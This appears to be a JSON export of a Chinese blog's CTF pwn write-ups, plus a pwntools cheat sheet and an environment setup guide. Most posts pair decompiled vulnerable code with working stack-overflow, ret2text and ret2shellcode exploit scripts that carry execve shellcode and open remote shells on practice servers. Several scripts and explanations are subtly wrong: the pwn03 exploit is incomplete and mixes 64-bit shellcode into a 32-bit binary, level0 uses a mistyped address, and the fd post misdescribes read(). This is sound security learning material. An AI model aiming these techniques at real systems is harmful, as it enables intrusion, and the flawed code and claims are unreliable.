{"posts":[{"title":"[CTFshow]pwn03","content":"checksec： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(&quot;stack happy!&quot;); puts(&quot;32bits\\n&quot;); pwnme(); puts(&quot;\\nExiting&quot;); return 0; } pwnme()这里存在栈溢出漏洞： int pwnme() { char s; // [esp+Fh] [ebp-9h] fgets(&amp;s, 100, stdin); return 0; } 没有预留后门，需要自己写入。可以把后门写入.bss里。使用vmmap命令发现可写入： 正常计算偏移量为0x9+0x4 from pwn import * shell=&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; s_addr = 0x80484cf+0x9+0x4+0x4 shell_addr = 'a'*0x9+'a'*0x4+p64(s_addr)+shell io.interactive() ","link":"https://shawr00t.github.io/ctfshowpwn03/"},{"title":"[CTFshow]01栈溢出之ret2text","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdin, 0LL, 1, 0LL); setvbuf(stdout, 0LL, 2, 0LL); welcome(); return 0; } 可以看到主程序会回显输入的内容，然后调用welcome()。 welcome()内容如下： int welcome() { char s; // [rsp+0h] [rbp-80h] gets(&amp;s); return puts(&amp;s); } 存在后门ctfshow()。地址为0x400637 溢出点在welcome()里。编写exp即可，不想说太多： from pwn import * io = process('./pwn') payload = 'a'*0x80+'a'*0x8+p64(0x400637) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/ctfshow01-zhan-yi-chu-zhi-ret2text/"},{"title":"[CTFshow]pwn02","content":"查看checksec： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 使用IDA查看其main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(&quot;stack happy!&quot;); puts(&quot;32bits\\n&quot;); pwnme(); puts(&quot;\\nExiting&quot;); return 0; } pwnme()内容如下： int pwnme() { char s; // [esp+Fh] [ebp-9h] fgets(&amp;s, 50, stdin); return 0; } 可以看到其ebp为0x9，返回地址为0x4，而且该程序存在后门函数： int stack() { return system(&quot;/bin/sh&quot;); } 编写exp利用即可： from pwn import * io = remote('pwn.challenge.ctf.show','28155') payload = 'a'*0x9+'a'*0x4+p64(0x804850f) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/ctfshowpwn02/"},{"title":"[CTFhub]ret2shellcode","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf; // [rsp+0h] [rbp-10h] __int64 v5; // [rsp+8h] [rbp-8h] buf = 0LL; v5 = 0LL; setvbuf(_bss_start, 0LL, 1, 0LL); puts(&quot;Welcome to CTFHub ret2shellcode!&quot;); printf(&quot;What is it : [%p] ?\\n&quot;, &amp;buf, 0LL, 0LL); puts(&quot;Input someting : &quot;); read(0, &amp;buf, 0x400uLL); return 0; } 没有预留的后门，这道题可以写在栈上。用gdb调试，发现栈区可以写入。 buf的地址在程序运行的时候会回显。buf变量的rbp为0x10，宽度为0x8，总共为24字节。 这次我使用了长度为23字节的shell： shell=&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; 但是因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode。所以要把shellcode放到返回地址之后。 from pwn import * io = process('./pwn') io.recvuntil('[') # buf与rbp的距离16 + rbp的宽度8 + 返回地址的长度8 address = int(io.recvuntil(']')[:-1],16)+0x10+0x8+0x8 shell=&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; payload = 'a'*0x10+'a'*0x8+p64(address)+shell io.sendlineafter('someting : ',payload) io.interactive() ","link":"https://shawr00t.github.io/ctfhubret2shellcode/"},{"title":"[PWN]ret2shellcode学习笔记","content":"跟着天正师傅博客学的： 例题附件下载 checksec，这次是32位的： [*] '/home/shawroot/Desktop/ret2sc' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-14h] setvbuf(stdout, 0, 2, 0); printf(&quot;Name:&quot;); read(0, &amp;name, 0x32u); printf(&quot;Try your best:&quot;); return (int)gets(&amp;s); } 有两处输入的地方，分别用了read()和gets()函数去实现。name变量长度足够，不存在栈溢出，gets()函数未限制输入的长度，存在栈溢出。 但是这道题没有back♂door了，不能用之前学的ret2text去利用，必须自己再写一个shellcode进去。 写接下来的内容之前，需要了解bss段： bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，bss段属于静态内存分配。 可以使用readelf命令查看bss段的地址： readelf -S filename 能看到bss的地址为0x0804a040。 接下来将程序导入gdb并运行，ctrl+c将程序中断，利用vmmap查看地址段权限，必须保证bss段有可执行权限，shellcode才能运行。 $ gdb ret2sc gdb-peda$ r # ctrl + c gdb-peda$ vmmap bss段地址0x0804a040在范围0x0804a000到0x0804b000之间，它是可读可写的，name变量也在bss段中，地址为0x0804A060可以把shellcode写进name变量里，让gets()函数的那里的返回地址溢出到name变量所在的地方。 找寻溢出偏移。首先打开另一个终端，输入gdb后，使用pattern create 100命令生成一个100长度的字符串。 再使用gdb调试题目，按下r键。因为name处不存在溢出，在“Try your best:”下面把这串字符串粘进去，得到程序被中断的警告，程序的返回地址（0x41412941）被输入的字符串覆盖了。再使用pattern offset 0x41412941命令计算偏移量，得到32。 至此，可以编写exp了： from pwn import * io = process('./ret2sc') shellcode = asm(shellcraft.sh()) name_addr = 0x0804A060 payload = 'a'*32+p32(name_addr) io.sendlineafter('Name:',shellcode) io.sendlineafter('best:',payload) io.interactive() ","link":"https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/"},{"title":"[Pwntools]学习笔记","content":"0x00 链接 连接远程服务器： r = remote('[ip]','[port]') 需要在本地进行测试： r = process('./filename') 0x01 设置运行时的参数 通过设置目标架构和操作系统，来告诉Pwntools程序的运行环境。 context.arch = 'i386' #32位程序设置为'i386'，64位程序设置为'amd64'。 context.os = 'linux' context.log_level = 'debug' #可在屏幕上打印debug信息。 context.endian = 'big' #设置字节序为大端序，小端序设置为little。 比较推荐的是使用context.binary自动设置所有适当的值。 from pwn import * context.binary = './filename' 0x02 接收远端回传的数据 r.interactive() #在取得shell之后使用,直接进行交互，相当于回到shell的模式。 r.recv(numb=字节大小, timeout=default) #接收数据。 r.recvline(keepends=True) #接收一行，keepends为是否保留行尾的\\n。 r.recvall() #接收数据，直到达到EOF。 r.recvrepeat(timeout=default) #持续接受直到EOF或timeout。 0x03 向远端发送数据 r.send() #发送数据。 r.sendline() #发送一行数据。 r.sendlineafter('str',payload) #当接收到指定数据时，发送数据。 0x04 获取函数地址 在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。 puts_addr = elf.address #获取文件装载的基地址。 puts_got_addr = elf.got['puts'] #获取puts函数got表地址。 puts_plt_addr = elf.plt['puts'] #获取puts函数plt表地址。 puts_sym_addr = elf.symbols['puts'] #获取puts函数符号表地址。 0x05 shellcraft Pwntools已经为你准备好的shellcode。 print shellcraft.i386.linux.sh() #32位。 print shellcraft.amd64.linux.sh() #64位。 Pwntools 提供的 shellcraft 库中的 shellcode 是被asm()函数进行汇编的。 from pwn import * shellcode = asm(shellcraft.amd64.linux.sh()) 0x06 整数的打包解包 p32() #将数据打包成32位二进制格式，字节序由context.endian设置。 p64() #将数据打包成64位二进制格式，字节序由context.endian设置。 u32() #将32位二进制格式数据解包。 u64() #将64位二进制格式数据解包。 ","link":"https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/"},{"title":"[BUUCTF]rip","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments main函数： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+1h] [rbp-Fh] puts(&quot;please input&quot;); gets(&amp;s, argv); puts(&amp;s); puts(&quot;ok,bye!!!&quot;); return 0; } s的rbp为0xf，返回地址为0x8，然后看下back♂door函数： int fun() { return system(&quot;/bin/sh&quot;); } 栈溢出，back♂door的地址为0x401197，exp我写成如下的形式： from pwn import * io = remote('node3.buuoj.cn',27563) payload = 'a'*0xf+'a'*0x08+p64(0x401186) io.sendline(payload) io.interactive() 出乎意料的报错了，查了下资料： buuctf 最新使用的 ubuntu 18.04 要求 system 函数调用时栈指针必须 16 对齐。 需要ret到 ret 这个指令本身的地址，再ret一遍到后门，修改后的exp如下： from pwn import * io = remote('node3.buuoj.cn',27563) payload = 'a'*0xf+'a'*0x08+p64(0x401142)+p64(0x401186) io.sendline(payload) io.interactive() 也可以ret到后门函数顶上的 mov rdp rsp（把rsp这个栈指针（Stack Pointer）的值复制到rbp里，rsp始终会指向栈顶）那里： from pwn import * io = remote('node3.buuoj.cn',27563) payload = 'a'*0xf+'a'*0x08+p64(0x401187)+p64(0x401186) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/buuctfrip/"},{"title":"[CTFhub]ret2text","content":" ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 checksec了一下，64位没开任何保护。 main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp+0h] [rbp-70h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;Welcome to CTFHub ret2text.Input someting:&quot;); gets(&amp;v4, 0LL); puts(&quot;bye&quot;); return 0; } 找到栈大小和返回地址后，看secure函数，内容如下： int secure() { unsigned int v0; // eax int result; // eax int v2; // [rsp+8h] [rbp-8h] int v3; // [rsp+Ch] [rbp-4h] v0 = time(0LL); srand(v0); v3 = rand(); __isoc99_scanf((__int64)&amp;unk_4008C8, (__int64)&amp;v2); result = v2; if ( v3 == v2 ) result = system(&quot;/bin/sh&quot;); return result; } system(&quot;/bin/sh&quot;);的内存地址位0x4007b8，写脚本： from pwn import * p = remote('challenge-93c6eb0adcd5b58f.sandbox.ctfhub.com',35615) payload = 'a'*0x70+'a'*0x08+p64(0x4007B8) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/ctfhubret2text/"},{"title":"[pwnable.kr]collision","content":"ssh连接后，可查看代码如下： #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0; } 分析代码得知传入的参数要经过check_password()的处理，且小于20个字节，且必须等于hashcode。 分析check_password()函数： unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } 这里是将char*p强制转换成int*p。int类型在32位机里占4字节，char类型占1个字节，所以是将20个字节的字符串转化成了5组，每组4个字节。 因此，最理想的情况下是将hashcode的值五等份。其值转为10进制为568134124，无法被五整除。 所以考虑(568134124+1)/5=113626825，这样113626825*4+113626824就等于568134124了。 因为C语言是小段存储，113626825转为十六进制为0x6c5cec9，要写成&quot;C9 CE C5 06&quot;这样的格式。即\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 由于ASCII码只包含128位，计算的字符都是不可显示字符，要利用python写入： ./col `python -c 'print &quot;\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06&quot;'` ","link":"https://shawr00t.github.io/pwnablekrcollision/"},{"title":"[pwnable.kr]fd","content":"ssh连进去，没有查看flag文件的权限。 fd.c代码如下： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } 很直接的可以看到得到flag的条件是让buf等于&quot;LETMEWIN\\n&quot;。 因为read函数的第一个参数为0时是写入，所以让fd为零即可。顺便马一下，atoi()是转数字的函数，和python中的int(str)差不多。0x1234转为十进制为4660，执行时第一个参数为4660，然后输入LETMEWIN，敲回车得到flag。 ","link":"https://shawr00t.github.io/pwnablekrfd/"},{"title":"[BugKu]overflowPWN","content":"checksec看了下，四个保护都没有开。 main中代码如下： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-30h] memset(&amp;s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;say something?&quot;); read(0, &amp;s, 0x100uLL); puts(&quot;oh,that's so boring!&quot;); return 0; } 还看到了直接获取flag的get_shell_函数，地址是0x400751： int get_shell_() { puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;); puts(&quot;this is your flag!&quot;); return system(&quot;cat flag&quot;); } 可以利用read函数溢出让返回地址为0x400751，exp如下： from pwn import * p = remote('114.67.246.176',16081) payload = 'a'*0x30+'a'*0x8+p64(0x400751) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/bugkuoverflowpwn/"},{"title":"[攻防世界]PWN-level0","content":"checksec查看一下信息，发现其开启了NX保护。 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 使用IDA打开，main中只有这几行代码： int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;Hello, World\\n&quot;, 0xDuLL); return vulnerable_function(1LL, &quot;Hello, World\\n&quot;); } 双击vulnerable_function()函数，看到如下代码： ssize_t vulnerable_function() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x200uLL); } 这里的rbp是栈基地址寄存器，保存的是当前的栈底地址为0x80，但是可输入的大小为0x200。 双击&amp;buf看到返回地址： 返回地址可以覆盖成callsystem()，地址为0x400596，可命令执行： int callsystem() { return system(&quot;/bin/sh&quot;); } 最终脚本如下： from pwn import * p = remote('111.200.241.244',63770) payload = 'a'*0x80+'a'*0x8+p64(0x500596) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/"},{"title":"[攻防世界]hello_pwn","content":"checksec检查程序保护机制： checksec可以检查程序保护机制，从而查看题目开启了哪些保护机制，有助于对题目的初步分析。 Arch：程序位数(查看是多少位的程序，比如32或64位)，也可以查看是哪个微处理器，比如i386为32位微处理器，amd64为64位微处理器(x86架构的延伸产品，称为x86-64，后改名为AMD64)； RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT(Global Offset Table)攻击。RELEO为&quot;Partial RELRO&quot;，说明我们对GOT表有写权限。 Stack：栈溢出监测，查看程序是否开启了Canary防护(一种对函数栈的监测保护：还没等到栈溢出，先返回canary word，从而监测栈溢出情况)。 NX ：No-eXecute(不可执行)，相等于windows的DEP(数据执行保护)，就是将攻击者构造的payload和shellcode(一般为系统远程执行命令)所在的内存页标识为不可执行，当攻击代码想要以数据代码伪装成可执行代码时，就会被检测到，从而使CPU抛出异常，从而不执行恶意指令。 PIE：内存地址空间分布随机化(ASLR:address space layout randomization) 根据图片结果可以得知，该题是一个64位的程序，没有开启RELRO，没有开启栈溢出检测，开启了NX，没有开启内存地址空间分布随机化。 把题目文件拖进IDA中查看伪代码： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { alarm(0x3Cu); setbuf(stdout, 0LL); puts(&quot;~~ welcome to ctf ~~ &quot;); puts(&quot;lets get helloworld for bof&quot;); read(0, &amp;unk_601068, 0x10uLL); if ( dword_60106C == 1853186401 ) sub_400686(); return 0LL; } alarm(0x3Cu);：alarm()中的参数0x3Cu是十六进制无符号数，即十进制对应60，所以该函数的作用是在程序运行60秒后，给进程发送SIGALRM信号，如果不另编写程序接受处理此信号，则默认结束此程序。 setbuf(stdout, 0LL);：是重置输出流，要么在网络传输中会传不出去。（本地加不加没区别 read(0, &amp;unk_601068, 0x10uLL);：read()可以读取数据，第一个参数为0，代表标准输入，第三个参数是输入的个数是0x10，即16个字节。就是从0x601068开始往后读取16个字节。 sub_400686()直接可以查看flag.txt文件： __int64 sub_400686() { system(&quot;cat flag.txt&quot;); return 0LL; } 所以要想拿到flag，必须要让dword_60106C == 1853186401。 因为能够利用unk_601068的读取数据，所以可以让数据溢出到dword_60106C，给dword_60106C赋值为0x6e756161，即可得到flag。 0x601068-0x60106c=0x4，看图也能看出来，缓冲区地址和目标地址之间的内存空间大小0x4。向其中填满脏数据即可。 from pwn import * p = remote('111.200.241.244', 64306) payload=0x4*'c'+p64(1853186401) #p64就是将一个数字转换为字符。 p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/"},{"title":"PWN环境搭建","content":"参考文档：https://github.com/leungbless/pwnVM-ovf 0x00 环境 操作系统：Ubuntu 16.04 0x01 更换源 cd ~ &amp;&amp; mkdir .pip cd ~/.pip &amp;&amp; touch pip.conf sudo gedit pip.conf 然后写入以下内容： [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=mirrors.aliyun.com sudo apt-get update sudo apt-get upgrade 0x02 安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型 sudo apt-get update sudo apt-get install git gdb gdb-multiarch sudo apt-get install &quot;binfmt*&quot; 0x03 安装gdb的插件pwndbg git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 0x04 安装PwnTools sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential pip install -U setuptools pip install --upgrade pip pip install --upgrade pwntools 这里如果出现报错，尝试： wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python get-pip.py pip install --upgrade pwntools 0X05 安装ssh sudo apt-get install ssh 0x06 安装ROPgadget工具 pip install ropgadget 0x07 安装qemu sudo apt-get install qemu-user 0x08 安装LibcSearcher(用处: 用来泄露libc库中函数的偏移的库) git clone https://github.com.cnpmjs.org/lieanu/LibcSearcher.git cd LibcSearcher sudo python setup.py develop 0x09 安装32位程序依赖的环境 sudo dpkg --add-architecture i386 sudo apt-get -y install lib32z1 lib32ncurses5 ","link":"https://shawr00t.github.io/pwn-huan-jing-da-jian/"}]}